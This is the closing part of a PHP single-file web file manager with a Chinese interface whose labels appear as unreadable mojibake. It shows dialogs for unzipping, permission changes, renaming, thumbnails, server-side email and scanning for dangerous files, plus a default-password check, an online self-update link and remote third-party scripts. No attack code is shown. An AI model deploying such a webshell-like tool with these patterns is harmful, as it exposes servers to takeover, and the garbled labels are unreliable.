	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100" title="��֧�ֳ���ѹ���ļ���ѹ">
��ѹ·��:<input type="text" name="key3" size="20" id="newT5" value="" onkeydown="return disableEnter(event)"><input type="button" value="��ѹ" name="B1" onclick="extract();">
           </td>
	</tr>
</table>
</div>


<div id="smallLay9" style="display:none">
<table border="0" width="300" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">�޸�����</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
<iframe name="key666" id="key666"  target="main" src=""  width="100%" height="180" frameborder="0" scrolling="no"></iframe>
    </td>
	</tr>
</table>
</div>
<div id="smallLay10" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">�޸�����</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
�޸ĺ������:<input type="text" name="key6" size="20" id="newT6" value="" onkeydown="return disableEnter(event)"><input type="button" value="�޸�" name="B1" onclick="property();">
    </td>
	</tr>
</table>
</div>

<div id="smallLay11" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">��������</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
<input type="text" name="oldname" size="8" id="oldname" style="width:0px;display:none;">�޸ĺ���ļ���:<input type="text" name="newname" size="10" id="newT8" value="" onkeydown="return disableEnter(event)"><input type="button" value="�޸�" name="B1" onclick="Newname()">
           </td>
	</tr>
</table>
</div>
<div id="smallLay14" style="display:none">
	<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">��ͼ</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
<fieldset style="padding: 2">
	<legend>������ͼ</legend>
<table border="0" width="100%">
	<tr title="�Ե�ǰĿ¼Ϊ��Ŀ¼����">
		<td width="120"  align="right">���ɵ�Ŀ¼:</td>
		<td><input type="text" name="imgT1" size="20" id="imgT1"></td>
	</tr>
	<tr>
		<td width="120"  align="right">�ļ���ǰ׺:</td>
		<td><input type="text" name="imgT2" size="20" id="imgT2" value="S_"></td>
	</tr>
	<tr>
		<td width="120"  align="right">��:</td>
		<td><input type="text" name="imgT3" size="13" id="imgT3"></td>
	</tr>
	<tr>
		<td width="120"  align="right">��:</td>
		<td><input type="text" name="imgT4" size="13" id="imgT4"></td>
	</tr>
	<tr>
		<td width="120"  align="right">��ʽ:</td>
		<td><input type="radio" value="0" name="imgR1" checked>�ȱ�<input type="radio" value="1" name="imgR1">�ü�</td>
	</tr>
	<tr>
		<td></td>
		<td><input type="button" value="����" name="B1" onclick="simg()"></td>
	</tr>
</table>
</fieldset>
<fieldset style="padding: 2">
	<legend>����ICOͼ��</legend>
<iframe name="ico" id="ico"  target="main" src="?ico=yes&dir=<?=$dir?>" width="100%"  height="120" frameborder="0" scrolling="no"></iframe>
</fieldset>
    </td>
	</tr>
</table>
</div>


<div id="smallLay17" style="display:none">
<table border="0" width="623" height="370" cellspacing="0" cellpadding="0">
	<tr>
	<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">���͵����ʼ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" height="348">
<table border="0" width="623" height="100%">
	<tr>
		<td height="14" width="62">�ռ���:</td>
		<td height="14" width="455"><input type="text" name="to" size="20" id="mail1"></td>
                <td>������:</td>
	</tr>
	<tr>
		<td height="23" width="62">������:</td>
		<td height="23" width="455"><input type="text" name="from" size="20" id="mail2" value="<?=$color5?>"></td>
               <td rowspan="3"><div id="maildiv" style="width:200px;height:296px;margin: 5px;padding:5px;overflow-y:scroll;"></div></td>
	</tr>
	<tr>
		<td height="23" width="62" valign="top">������:</td>
		<td height="23" width="455" valign="top"><input type="text" name="subject" size="20" id="mail2"></td>
	</tr>
	<tr>
		<td colspan="2"><textarea name="body" cols="20"  rows="17" style="width:100%; height:250px" id="mail3"></textarea></td>
	</tr>
	<tr>
		<td  colspan="3" height="20">
		<input type="button" value="���͵����ʼ�" name="B1" onclick="mail()"></td>
	</tr>
</table>
		</td>
	</tr>
</table>
</div>
<div id="smallLay18" style="display:none;top:100px;">
<table border="0" width="300" cellspacing="0" cellpadding="0">
	<tr>
	<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">�༭MP3</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF">
<input type="hidden" name="mp3file" value="" id="mp3file">
<table border="0" width="100%">
	<tr>
		<td>Title(����)</td>
		<td><input type="text" name="Title" size="20" id="Title"></td>
	</tr>
	<tr>
		<td>Artist(������)</td>
		<td><input type="text" name="Artist" size="20" id="Artist"></td>
	</tr>
	<tr>
		<td>AlbumTitle(ר������)</td>
		<td><input type="text" name="AlbumTitle" size="20" id="AlbumTitle"></td>
	</tr>
	<tr>
		<td>Copyright(��Ȩ)</td>
		<td><input type="text" name="Copyright" size="20" id="Copyright"></td>
	</tr>
	<tr>
		<td>Description (����)</td>
		<td><input type="text" name="Description" size="20" id="Description"></td>
	</tr>
	<tr>
		<td>Year(���)</td>
		<td><input type="text" name="Year" size="20" id="Year"></td>
	</tr>
	<tr>
		<td>Genre (����)</td>
		<td><input type="text" name="Genre" size="20"  id="Genre"></td>
	</tr>
	<tr>
		<td width="613" colspan="2" height="20">
		<input type="button" value="�ύ�޸�" name="B1" onclick="mp3()"></td>
	</tr>
</table>
		</td>
	</tr>
</table>
</div>
<div id="smallLay19" style="display:none;">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="property"></div></td><td><font color="#FFFFFF">ɨ��Σ���ļ�</font>(�ļ�̫������)</td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center"  height="100">
Ҫɨ���Ŀ¼:<input type="text" name="path" size="25" id="newT19" value="" onkeydown="return disableEnter(event)">
<input type="button" value="��ʼɨ��" name="B1" onclick="btnScan()">
           </td>
	</tr>
</table>
</div>	

<div  id='mullu'>

</div>
		</td>
	</tr>
<?
}
/////////////////////////////////////////����///////////////////////////////////////////
?>
<div id="yangwen" style="display:none">
<img src="" id="imgyangwen" title="�ҵ��˰���ǰ���ĳ��򸴿���һ��:�����PHP�༭��������!">
</div>
<div id="yangwen2" style="display:none">
<iframe name="aaaaaw" id="aaaaaw"  target="main" src=""  width=500px height=420px style=background:#FFF></iframe>
</div>
	<tr>
		<td id="bottom2" align="right">
������������:<?=byte_format(disk_total_space(realpath($dir)))?>, �Ѿ�ʹ��:<?echo byte_format(disk_total_space(realpath($dir))-disk_free_space(realpath($dir)))?>, ʣ���������:<?=byte_format(disk_free_space(realpath($dir)))?>
 | <a href="javascript:void((function(){var e=document.createElement('script');e.setAttribute('src','http://www.baidu.com/olime/bdime_open.js');document.body.appendChild(e);})())" title="�ٶȿ���ȥ�����������е�ʱ�������!">�ٶ�ƴ��</a>
<a href="javascript:void((function(){var e=document.createElement('script');e.setAttribute('src','http://web.pinyin.sogou.com/web_ime/init.js');document.body.appendChild(e);})())" title="�ѹ�һ���">�ѹ�ƴ��</a>
<a href="javascript:(function(q){!!q?q.toggle():(function(d,j){j=d.createElement('script');j.src='//ime.qq.com/fcgi-bin/getjs';j.setAttribute('ime-cfg','lt=2');d.getElementsByTagName('head')[0].appendChild(j)})(document)})(window.QQWebIME)" title="QQƴ�����������뷨">QQƴ��</a>
 | <a href="#" onclick="showid('yangwen2'),$$('aaaaaw').src='http://cddyrs.com/ad/book.php';">���ⷴ��</a>
 | <span id="gengxin2"><a href="#"  onclick="getData2('?gx=1','gengxin2');" title="����Ƿ����µİ汾,������°汾�������߸���.">������</a></span>  
 | <a href="#" onclick="showid('yangwen'),$$('imgyangwen').src='?imgname=yangwen';" title="�ҵ��˰���ǰ���ĳ��򸴿���һ��:�����PHP�༭��������!"> ..::�������ġ�</a>
</td>
	</tr>
</table>
</form>
<iframe name="ajaxurl" id="ajaxurl"  target="main" src="<?if($bj==1){?>?iframeA=6&dir=<?=urlencode($dir)?><?}else{?>?iframeA=1&dir=<?if($olddira1==""){echo ".";}else{echo urlencode($olddira1);}}?>" style="display:none"></iframe>
<div id="link" style="display:none"></div>
<script>
<?if($new!=1){?>
getData('?bj=1&A=<?if($encode=="UTF-8"){echo "utf8";}else{echo "1";}?>&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($fileName)?>','c2','<?=$dir?>','<?=$fileName?>');
<?}else{?>
$$('T2').value='<?=$fileName?>';
$$('Tdir').value='<?=$dir?>';
$$('Tdir2').value='<?=$dir?>';
document.title='�༭ <?=$fileName?>';
var path='<?=$fileName?>';
var p=path.lastIndexOf("."); 
var name=path.substr(++p,path.length-p).toLowerCase( ); 
getData2('?button='+name,'button');
	
<?}if($bj==""){?>
var divA=new FixedBox(document.getElementById("menu4"));
   	addEvent(window,"scroll",function(){
		divA.setCss();
	});

<?}?>

window.onload=window.onresize=function(){
var $bh=document.documentElement.clientHeight;
var $bw=document.documentElement.clientWidth;
$$('loadDiv').style.height=$bh-310+"px";
<?if($bj==1){?>
$$('c2').style.width=($$('c2td').offsetWidth-55)+"px";  
$$('ci').style.width=$$('bbbbb').style.width=$$('c2').offsetWidth+"px";
setInterval("getData2('?iframeA=link','link');",1000*60*10);//���ֱ༭ҳ�治��ʱ
utf8gbk('<?=$encode?>');
<?}?>
if($bh>10){
$$('body').style.height=($bh-160)+"px";
<?if($adminpass==md5('000000')){?>
showid('smallLay');
alert("��ѡ����������!");
<?} if($bj==1){?>
$$('MF').style.height=($bh-219)+"px";
$$('F').style.height=($bh-420)+"px";
$$('li').style.height=($bh-268)+"px";
$$('mjs').style.height=($bh-253)+"px";
$$('c2').style.height=($bh-  253)+"px";
$$('love2').style.height=$$('love').style.height=$$('bbbbb').style.height=$$('c2').offsetHeight+"px";
$$('loadDiv2').style.display='none';
$$('loadDiv2').style.height=$bh-310+"px";
/////////////////////////
document.onmousemove=doMove;
document.onmousedown=doDown;
document.onmouseup=doUp;
//////////////////////////
<?}?>
}
}
</script>
</body>
</html>
<?
}//��½����

ob_end_flush();
//ѹ������
function ob_gzip($content){  
if(!headers_sent()&&extension_loaded("zlib")&&strstr($_SERVER["HTTP_ACCEPT_ENCODING"],"gzip")){  
$content = gzencode($content,9);  
header("Content-Encoding: gzip");  
header("Vary: Accept-Encoding");  
header("Content-Length: ".strlen($content));  
}  
return $content;  
}  
?>